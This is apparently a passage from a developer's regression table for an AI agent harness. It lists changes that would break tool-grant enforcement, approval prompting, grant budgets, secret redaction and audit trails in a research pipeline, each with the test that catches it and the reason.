| Cache a failed effort lookup | `test_a_failed_lookup_is_not_cached` | One transient error would suppress the capability query for the whole process |
| Return the container unchanged at `_MAX_REDACT_DEPTH` | `TestDepthCapFailsClosed` | The cap stops stack exhaustion; failing open made it a deterministic redaction bypass |
| Drop `"error"` from `_SCANNED_KEYS` | `TestErrorChannelRedaction` | MCP reports failures in band, so third-party text lands there |
| Restore `always_update=True` on `RavenPanel.state` | `test_same_state_reassignment_does_not_redraw_the_raven` | Every token delta reassigns the same value |
| Build `ConversationMemory` in `on_mount` again | `test_launching_and_quitting_persists_no_thread` | Constructing one persists a thread row |

## §25 — authorized tool use in the research pipeline

| Change | What breaks | Fix / why |
|---|---|---|
| Make `registry.grantable()` return True for everything | `TestGrantability`, `TestTheLoopEnforcesGrantability` | A tool deciding approval from its PARAMS was never consented to by name. Ticking "shell" is not agreeing to whatever command the model later picks |
| Drop the `registry.grantable` term from `_run()`'s grant check | `TestTheLoopEnforcesGrantability` (2), `test_candidate_approvals_omits_tools_the_grant_cannot_cover` | The loop is the enforcement point; a stale or hand-built grant set must not widen anything |
| Stop filtering `candidate_approvals()` to grantable tools | `test_candidate_approvals_omits_tools_the_grant_cannot_cover` | The sign-off notice would promise authority the grant does not carry — worse than not offering it |
| Remove `PIPELINE_UNGRANTABLE` / add `spawn_subagent` back | `TestCandidates` | Approving a spawn IS §18's sign-off; pre-granting it unattended compounds one yes into unbounded delegated authority (R4) |
| Skip `grant_budget.take()` in the grant check | `TestGrantBudget` (3) | Pre-flight authorization gives up the natural bound on how many times a granted tool runs |
| Rebuild `GrantBudget` per pass instead of sharing it | `test_one_budget_is_shared_across_passes` | Multiplies the ceiling by the pass count while reading as if it enforced one |
| Make budget exhaustion deny instead of falling through | `test_exhaustion_falls_back_to_asking_not_to_failing`, `test_budget_exhaustion_falls_through_to_the_provider` | The ceiling would become a hard stop on a supervised run |
| `headless = permission_channel is None` again | `TestHeadlessIsAboutBeingUNABLEToAsk` | "Headless" means unable to ask. A pass with an `ApprovalProvider` CAN ask, so hiding its tools reports a limitation it does not have |
| Stop consulting `approval_provider` in `_obtain_approval` | `TestTheProviderAnswers` | `run_to_completion()` discards the `permission_request` event, so a queue alone blocks with nothing displayed |
| Let the provider win over a live `permission_channel` | `test_the_channel_wins_when_both_are_present` | The channel is the more specific arrangement; a provider would ask again about a question already on screen |
| Honour `grant_scope` regardless of the provider | `TestRunScope`, `test_the_provider_declines_run_scope` | R11: a mode whose purpose is per-call supervision must not let one yes cover later calls |
| Drop `authorization=` from `continue_conversation` | `test_the_json_retry_carries_it_into_the_same_thread` | A retry is the same pass continuing; omitting it strips the pass's tools on the attempt where the model is already struggling |
| Drop `**_authorization_kwargs(...)` from `run_deep_research_mode` | `test_the_pass_entry_point_unpacks_the_bundle_into_the_loop` | Every other test mocks over this layer, so all of them pass with the tools still hidden |
| Copy `granted_calls` onto the run at the end instead of sharing the list | `TestTheTrailSurvivesAFailedRun` | The trail would be lost on the failure path and at every §5 checkpoint — the runs most worth auditing |
| Write `granted_calls.json` unconditionally | `test_absent_when_nothing_was_granted` | Its presence is the signal that a run carried pre-flight authorization; an always-empty file gets skimmed past |
| Accept `research.granted_tools` in `settings.json` | `test_granted_tools_is_rejected_by_name` | Standing authorization carried by any cloned repo, in the one config file where project tier beats user tier (R12) |
| Make `--grant` an `nargs="?"` flag again | `TestTheCliFlag` (7) | An optional-value flag eats the next token, so `--grant-tools "my query"` consumed the QUERY and failed about a missing positional |
| Handle `--attended` and `--grant` in a fixed order rather than a loop | `test_the_two_flags_compose_in_either_order` | `--grant --attended q` left "--attended q" as the research question |
| Give `ask_permission_blocking` a private queue | `test_quitting_during_an_attended_research_prompt_releases_the_worker` | `_release_permission_channel` could not see it — a fourth uncovered dismissal route, and the failure is a HANG (f10) |
| Drop `check_input_policy` from `dispatch()` | `TestDispatchEnforcesItBeforeTheHandlerRuns` | Arguments are the one direction that leaves the harness, and nothing was watching it |
| Redact arguments instead of refusing | `test_refused_call_raises_and_the_handler_never_runs` | The tool would run with parameters neither the model nor the user chose, and report success |
| Set `scan_keys=False` on the input path | `test_secret_in_an_argument_key_is_refused` | A dict key is a legal place to put a string and the model writes them |
| Fail open at the input depth cap | `TestInputDepthCapFailsClosed` | Same reasoning as the output cap: refusing to descend must mean refusing to proceed |
| Remove the provenance framing from the universal preamble | `TestProvenanceFraming` | Defence-in-depth only — but it is one line in one place, and every pass inherits it |
